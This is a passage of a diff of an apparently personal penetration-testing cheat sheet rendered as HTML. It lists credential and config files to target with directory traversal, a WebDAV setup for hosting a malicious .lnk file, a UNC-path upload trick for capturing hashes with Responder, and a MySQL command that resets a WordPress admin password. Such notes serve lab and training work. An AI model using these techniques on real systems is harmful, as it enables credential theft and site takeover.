-</span><span id="__span-61-52"><a id="__codelineno-61-52" name="__codelineno-61-52" href="#__codelineno-61-52"></a>wsgidav<span class="w"> </span>--host<span class="o">=</span><span class="m">0</span>.0.0.0<span class="w"> </span>--port<span class="o">=</span><span class="m">80</span><span class="w"> </span>--auth<span class="o">=</span>anonymous<span class="w"> </span>--root<span class="w"> </span>/home/kali/webdav
-</span><span id="__span-61-53"><a id="__codelineno-61-53" name="__codelineno-61-53" href="#__codelineno-61-53"></a>
-</span><span id="__span-61-54"><a id="__codelineno-61-54" name="__codelineno-61-54" href="#__codelineno-61-54"></a><span class="c1"># Proxy Python through Burp</span>
-</span><span id="__span-61-55"><a id="__codelineno-61-55" name="__codelineno-61-55" href="#__codelineno-61-55"></a><span class="c1"># https://www.th3r3p0.com/random/python-requests-and-burp-suite.html</span>
-</span><span id="__span-61-56"><a id="__codelineno-61-56" name="__codelineno-61-56" href="#__codelineno-61-56"></a><span class="nv">proxies</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">{</span><span class="s2">"http"</span>:<span class="w"> </span><span class="s2">"http://127.0.0.1:8080"</span>,<span class="w"> </span><span class="s2">"https"</span>:<span class="w"> </span><span class="s2">"http://127.0.0.1:8080"</span><span class="o">}</span>
-</span><span id="__span-61-57"><a id="__codelineno-61-57" name="__codelineno-61-57" href="#__codelineno-61-57"></a><span class="nv">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>requests.get<span class="o">(</span><span class="s2">"https://www.google.com/"</span>,<span class="w"> </span><span class="nv">proxies</span><span class="o">=</span>proxies,<span class="w"> </span><span class="nv">verify</span><span class="o">=</span>False<span class="o">)</span>
-</span><span id="__span-61-58"><a id="__codelineno-61-58" name="__codelineno-61-58" href="#__codelineno-61-58"></a>
-</span><span id="__span-61-59"><a id="__codelineno-61-59" name="__codelineno-61-59" href="#__codelineno-61-59"></a><span class="c1"># Small sample files for uploads</span>
-</span><span id="__span-61-60"><a id="__codelineno-61-60" name="__codelineno-61-60" href="#__codelineno-61-60"></a>https://github.com/mathiasbynens/small
-</span><span id="__span-61-61"><a id="__codelineno-61-61" name="__codelineno-61-61" href="#__codelineno-61-61"></a>
-</span><span id="__span-61-62"><a id="__codelineno-61-62" name="__codelineno-61-62" href="#__codelineno-61-62"></a><span class="c1"># File upload, collect file elsewhere (UNC path) by changing filename in Burp, e.g. to capture stuff in Responder</span>
-</span><span id="__span-61-63"><a id="__codelineno-61-63" name="__codelineno-61-63" href="#__codelineno-61-63"></a><span class="se">\\\\</span>IP<span class="se">\\</span><span class="nb">test</span>
-</span><span id="__span-61-64"><a id="__codelineno-61-64" name="__codelineno-61-64" href="#__codelineno-61-64"></a>
-</span><span id="__span-61-65"><a id="__codelineno-61-65" name="__codelineno-61-65" href="#__codelineno-61-65"></a><span class="c1"># Wordpress</span>
-</span><span id="__span-61-66"><a id="__codelineno-61-66" name="__codelineno-61-66" href="#__codelineno-61-66"></a><span class="c1"># https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/wordpress.html</span>
-</span><span id="__span-61-67"><a id="__codelineno-61-67" name="__codelineno-61-67" href="#__codelineno-61-67"></a>wpscan<span class="w"> </span>--url<span class="w"> </span>http://IP<span class="w"> </span>-v<span class="w">  </span>
-</span><span id="__span-61-68"><a id="__codelineno-61-68" name="__codelineno-61-68" href="#__codelineno-61-68"></a><span class="c1"># Replace admin password in database</span>
-</span><span id="__span-61-69"><a id="__codelineno-61-69" name="__codelineno-61-69" href="#__codelineno-61-69"></a>mysql<span class="w"> </span>-u<span class="w"> </span>USER<span class="w"> </span>--password<span class="o">=</span>PASS<span class="w"> </span>-h<span class="w"> </span>localhost<span class="w"> </span>-e<span class="w"> </span><span class="s2">"use wp;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"</span>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a><span class="c1"># Folders/files to look in</span>
+</span><span id="__span-62-2"><a id="__codelineno-62-2" name="__codelineno-62-2" href="#__codelineno-62-2"></a>/var/www/html/<span class="w"> </span>
+</span><span id="__span-62-3"><a id="__codelineno-62-3" name="__codelineno-62-3" href="#__codelineno-62-3"></a>/etc/passwd
+</span><span id="__span-62-4"><a id="__codelineno-62-4" name="__codelineno-62-4" href="#__codelineno-62-4"></a>/etc/shadow
+</span><span id="__span-62-5"><a id="__codelineno-62-5" name="__codelineno-62-5" href="#__codelineno-62-5"></a>/proc/self/environ
+</span><span id="__span-62-6"><a id="__codelineno-62-6" name="__codelineno-62-6" href="#__codelineno-62-6"></a>/var/www/html/webdav/passwd.dav
+</span><span id="__span-62-7"><a id="__codelineno-62-7" name="__codelineno-62-7" href="#__codelineno-62-7"></a>
+</span><span id="__span-62-8"><a id="__codelineno-62-8" name="__codelineno-62-8" href="#__codelineno-62-8"></a><span class="c1"># SSH key handling</span>
+</span><span id="__span-62-9"><a id="__codelineno-62-9" name="__codelineno-62-9" href="#__codelineno-62-9"></a>../.ssh/id_rsa
+</span><span id="__span-62-10"><a id="__codelineno-62-10" name="__codelineno-62-10" href="#__codelineno-62-10"></a>chmod<span class="w"> </span><span class="m">400</span><span class="w"> </span>id_rsa
+</span><span id="__span-62-11"><a id="__codelineno-62-11" name="__codelineno-62-11" href="#__codelineno-62-11"></a>sudo<span class="w"> </span>-l
+</span><span id="__span-62-12"><a id="__codelineno-62-12" name="__codelineno-62-12" href="#__codelineno-62-12"></a>
+</span><span id="__span-62-13"><a id="__codelineno-62-13" name="__codelineno-62-13" href="#__codelineno-62-13"></a>
+</span><span id="__span-62-14"><a id="__codelineno-62-14" name="__codelineno-62-14" href="#__codelineno-62-14"></a>
+</span><span id="__span-62-15"><a id="__codelineno-62-15" name="__codelineno-62-15" href="#__codelineno-62-15"></a><span class="c1"># Directory traversal Windows</span>
+</span><span id="__span-62-16"><a id="__codelineno-62-16" name="__codelineno-62-16" href="#__codelineno-62-16"></a>C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\d</span>rivers<span class="se">\e</span>tc<span class="se">\h</span>osts
+</span><span id="__span-62-17"><a id="__codelineno-62-17" name="__codelineno-62-17" href="#__codelineno-62-17"></a><span class="c1"># IIS web server files/folders</span>
+</span><span id="__span-62-18"><a id="__codelineno-62-18" name="__codelineno-62-18" href="#__codelineno-62-18"></a>C:<span class="se">\i</span>netpub<span class="se">\l</span>ogs<span class="se">\L</span>ogFiles<span class="se">\W</span>3SVC1<span class="se">\</span>
+</span><span id="__span-62-19"><a id="__codelineno-62-19" name="__codelineno-62-19" href="#__codelineno-62-19"></a>C:<span class="se">\i</span>netpub<span class="se">\w</span>wwroot<span class="se">\w</span>eb.config
+</span><span id="__span-62-20"><a id="__codelineno-62-20" name="__codelineno-62-20" href="#__codelineno-62-20"></a><span class="c1"># XAMPP PHP</span>
+</span><span id="__span-62-21"><a id="__codelineno-62-21" name="__codelineno-62-21" href="#__codelineno-62-21"></a>C:<span class="se">\x</span>ampp<span class="se">\a</span>pache<span class="se">\l</span>ogs
+</span><span id="__span-62-22"><a id="__codelineno-62-22" name="__codelineno-62-22" href="#__codelineno-62-22"></a>
+</span><span id="__span-62-23"><a id="__codelineno-62-23" name="__codelineno-62-23" href="#__codelineno-62-23"></a><span class="c1"># Decode Base64</span>
+</span><span id="__span-62-24"><a id="__codelineno-62-24" name="__codelineno-62-24" href="#__codelineno-62-24"></a><span class="nb">echo</span><span class="w"> </span>&lt;base64&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d
+</span><span id="__span-62-25"><a id="__codelineno-62-25" name="__codelineno-62-25" href="#__codelineno-62-25"></a><span class="c1"># Inspect file in binary</span>
+</span><span id="__span-62-26"><a id="__codelineno-62-26" name="__codelineno-62-26" href="#__codelineno-62-26"></a>xxd<span class="w"> </span>-b<span class="w"> </span>malware.txt
+</span><span id="__span-62-27"><a id="__codelineno-62-27" name="__codelineno-62-27" href="#__codelineno-62-27"></a>
+</span><span id="__span-62-28"><a id="__codelineno-62-28" name="__codelineno-62-28" href="#__codelineno-62-28"></a><span class="c1"># Test whether running in CMD or PS</span>
+</span><span id="__span-62-29"><a id="__codelineno-62-29" name="__codelineno-62-29" href="#__codelineno-62-29"></a><span class="o">(</span>dir<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span>*<span class="sb">`</span><span class="p">|</span><span class="nb">echo</span><span class="w"> </span>CMD<span class="o">)</span><span class="p">;&amp;</span>&lt;<span class="c1"># rem #&gt;echo PowerShell</span>
+</span><span id="__span-62-30"><a id="__codelineno-62-30" name="__codelineno-62-30" href="#__codelineno-62-30"></a>
+</span><span id="__span-62-31"><a id="__codelineno-62-31" name="__codelineno-62-31" href="#__codelineno-62-31"></a><span class="c1"># Exiftool, display duplicated and unknown tags</span>
+</span><span id="__span-62-32"><a id="__codelineno-62-32" name="__codelineno-62-32" href="#__codelineno-62-32"></a>exiftool<span class="w"> </span>-a<span class="w"> </span>-u<span class="w"> </span>document.pdf
+</span><span id="__span-62-33"><a id="__codelineno-62-33" name="__codelineno-62-33" href="#__codelineno-62-33"></a>
+</span><span id="__span-62-34"><a id="__codelineno-62-34" name="__codelineno-62-34" href="#__codelineno-62-34"></a><span class="c1"># Quickly scan files for content</span>
+</span><span id="__span-62-35"><a id="__codelineno-62-35" name="__codelineno-62-35" href="#__codelineno-62-35"></a>find<span class="w"> </span>.<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-name<span class="w"> </span><span class="s2">"FILENAME_HINT"</span><span class="w"> </span>-exec<span class="w"> </span>grep<span class="w"> </span>-niH<span class="w"> </span><span class="s2">"TERM"</span><span class="w"> </span><span class="o">{}</span><span class="w"> </span>+
+</span><span id="__span-62-36"><a id="__codelineno-62-36" name="__codelineno-62-36" href="#__codelineno-62-36"></a>
+</span><span id="__span-62-37"><a id="__codelineno-62-37" name="__codelineno-62-37" href="#__codelineno-62-37"></a><span class="c1"># Python2 env</span>
+</span><span id="__span-62-38"><a id="__codelineno-62-38" name="__codelineno-62-38" href="#__codelineno-62-38"></a>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>virtualenv<span class="w"> </span>python2<span class="w"> </span>python2-dev
+</span><span id="__span-62-39"><a id="__codelineno-62-39" name="__codelineno-62-39" href="#__codelineno-62-39"></a>curl<span class="w"> </span>https://bootstrap.pypa.io/pip/2.7/get-pip.py<span class="w"> </span>-o<span class="w"> </span>get-pip.py
+</span><span id="__span-62-40"><a id="__codelineno-62-40" name="__codelineno-62-40" href="#__codelineno-62-40"></a>sudo<span class="w"> </span>python2<span class="w"> </span>get-pip.py<span class="w">  </span>
+</span><span id="__span-62-41"><a id="__codelineno-62-41" name="__codelineno-62-41" href="#__codelineno-62-41"></a>pip2<span class="w"> </span>install<span class="w"> </span>virtualenv<span class="w">      </span>
+</span><span id="__span-62-42"><a id="__codelineno-62-42" name="__codelineno-62-42" href="#__codelineno-62-42"></a>python2<span class="w"> </span>-m<span class="w"> </span>virtualenv<span class="w"> </span>py2env<span class="w">  </span>
+</span><span id="__span-62-43"><a id="__codelineno-62-43" name="__codelineno-62-43" href="#__codelineno-62-43"></a><span class="nb">source</span><span class="w"> </span>py2env/bin/activate
+</span><span id="__span-62-44"><a id="__codelineno-62-44" name="__codelineno-62-44" href="#__codelineno-62-44"></a>python<span class="w"> </span>-V
+</span><span id="__span-62-45"><a id="__codelineno-62-45" name="__codelineno-62-45" href="#__codelineno-62-45"></a><span class="c1"># Install impacket for Pyhon2</span>
+</span><span id="__span-62-46"><a id="__codelineno-62-46" name="__codelineno-62-46" href="#__codelineno-62-46"></a>pip<span class="w"> </span>install<span class="w"> </span><span class="nv">impacket</span><span class="o">==</span><span class="m">0</span>.9.22
+</span><span id="__span-62-47"><a id="__codelineno-62-47" name="__codelineno-62-47" href="#__codelineno-62-47"></a><span class="c1"># Python3 env</span>
+</span><span id="__span-62-48"><a id="__codelineno-62-48" name="__codelineno-62-48" href="#__codelineno-62-48"></a>python3<span class="w"> </span>-m<span class="w"> </span>virtualenv<span class="w"> </span>py3env<span class="w">  </span>
+</span><span id="__span-62-49"><a id="__codelineno-62-49" name="__codelineno-62-49" href="#__codelineno-62-49"></a><span class="nb">source</span><span class="w"> </span>py3env/bin/activate
+</span><span id="__span-62-50"><a id="__codelineno-62-50" name="__codelineno-62-50" href="#__codelineno-62-50"></a>
+</span><span id="__span-62-51"><a id="__codelineno-62-51" name="__codelineno-62-51" href="#__codelineno-62-51"></a><span class="c1"># Open webdav folder, for example to host malicious .lnk file</span>
+</span><span id="__span-62-52"><a id="__codelineno-62-52" name="__codelineno-62-52" href="#__codelineno-62-52"></a>wsgidav<span class="w"> </span>--host<span class="o">=</span><span class="m">0</span>.0.0.0<span class="w"> </span>--port<span class="o">=</span><span class="m">80</span><span class="w"> </span>--auth<span class="o">=</span>anonymous<span class="w"> </span>--root<span class="w"> </span>/home/kali/webdav
+</span><span id="__span-62-53"><a id="__codelineno-62-53" name="__codelineno-62-53" href="#__codelineno-62-53"></a>
+</span><span id="__span-62-54"><a id="__codelineno-62-54" name="__codelineno-62-54" href="#__codelineno-62-54"></a><span class="c1"># Proxy Python through Burp</span>
+</span><span id="__span-62-55"><a id="__codelineno-62-55" name="__codelineno-62-55" href="#__codelineno-62-55"></a><span class="c1"># https://www.th3r3p0.com/random/python-requests-and-burp-suite.html</span>
+</span><span id="__span-62-56"><a id="__codelineno-62-56" name="__codelineno-62-56" href="#__codelineno-62-56"></a><span class="nv">proxies</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">{</span><span class="s2">"http"</span>:<span class="w"> </span><span class="s2">"http://127.0.0.1:8080"</span>,<span class="w"> </span><span class="s2">"https"</span>:<span class="w"> </span><span class="s2">"http://127.0.0.1:8080"</span><span class="o">}</span>
+</span><span id="__span-62-57"><a id="__codelineno-62-57" name="__codelineno-62-57" href="#__codelineno-62-57"></a><span class="nv">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>requests.get<span class="o">(</span><span class="s2">"https://www.google.com/"</span>,<span class="w"> </span><span class="nv">proxies</span><span class="o">=</span>proxies,<span class="w"> </span><span class="nv">verify</span><span class="o">=</span>False<span class="o">)</span>
+</span><span id="__span-62-58"><a id="__codelineno-62-58" name="__codelineno-62-58" href="#__codelineno-62-58"></a>
+</span><span id="__span-62-59"><a id="__codelineno-62-59" name="__codelineno-62-59" href="#__codelineno-62-59"></a><span class="c1"># Small sample files for uploads</span>
+</span><span id="__span-62-60"><a id="__codelineno-62-60" name="__codelineno-62-60" href="#__codelineno-62-60"></a>https://github.com/mathiasbynens/small
+</span><span id="__span-62-61"><a id="__codelineno-62-61" name="__codelineno-62-61" href="#__codelineno-62-61"></a>
+</span><span id="__span-62-62"><a id="__codelineno-62-62" name="__codelineno-62-62" href="#__codelineno-62-62"></a><span class="c1"># File upload, collect file elsewhere (UNC path) by changing filename in Burp, e.g. to capture stuff in Responder</span>
+</span><span id="__span-62-63"><a id="__codelineno-62-63" name="__codelineno-62-63" href="#__codelineno-62-63"></a><span class="se">\\\\</span>IP<span class="se">\\</span><span class="nb">test</span>
+</span><span id="__span-62-64"><a id="__codelineno-62-64" name="__codelineno-62-64" href="#__codelineno-62-64"></a>
+</span><span id="__span-62-65"><a id="__codelineno-62-65" name="__codelineno-62-65" href="#__codelineno-62-65"></a><span class="c1"># Wordpress</span>
+</span><span id="__span-62-66"><a id="__codelineno-62-66" name="__codelineno-62-66" href="#__codelineno-62-66"></a><span class="c1"># https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/wordpress.html</span>
+</span><span id="__span-62-67"><a id="__codelineno-62-67" name="__codelineno-62-67" href="#__codelineno-62-67"></a>wpscan<span class="w"> </span>--url<span class="w"> </span>http://IP<span class="w"> </span>-v<span class="w">  </span>
+</span><span id="__span-62-68"><a id="__codelineno-62-68" name="__codelineno-62-68" href="#__codelineno-62-68"></a><span class="c1"># Replace admin password in database</span>
+</span><span id="__span-62-69"><a id="__codelineno-62-69" name="__codelineno-62-69" href="#__codelineno-62-69"></a>mysql<span class="w"> </span>-u<span class="w"> </span>USER<span class="w"> </span>--password<span class="o">=</span>PASS<span class="w"> </span>-h<span class="w"> </span>localhost<span class="w"> </span>-e<span class="w"> </span><span class="s2">"use wp;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"</span>
 </span></code></pre></div>
 <h3 id="kali-setup">Kali Setup<a class="headerlink" href="#kali-setup" title="Permanent link">¶</a></h3>
 <p>Python2 virtual environment</p>
@@ -4338,8 +4418,8 @@ apt-get install wine32</p>
 <p>Download seclists</p>
 <p>Burp plugin and cert</p>
 <p>Copy /usr/share/shells to Downloads for easy access and backup</p>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a><span class="nb">cd</span><span class="w"> </span>/usr/share/wordlists/
-</span><span id="__span-62-2"><a id="__codelineno-62-2" name="__codelineno-62-2" href="#__codelineno-62-2"></a>sudo<span class="w"> </span>gzip<span class="w"> </span>-d<span class="w"> </span>rockyou.txt.gz
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a><span class="nb">cd</span><span class="w"> </span>/usr/share/wordlists/
+</span><span id="__span-63-2"><a id="__codelineno-63-2" name="__codelineno-63-2" href="#__codelineno-63-2"></a>sudo<span class="w"> </span>gzip<span class="w"> </span>-d<span class="w"> </span>rockyou.txt.gz
 </span></code></pre></div>
 
 
@@ -4361,7 +4441,7 @@ apt-get install wine32</p>
     <span class="md-icon" title="Last update">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"></path></svg>
     </span>
-    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="May 21, 2026 18:31:13 UTC">May 21, 2026</span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="June 2, 2026 20:38:23 UTC">June 2, 2026</span>
   </span>
 
     
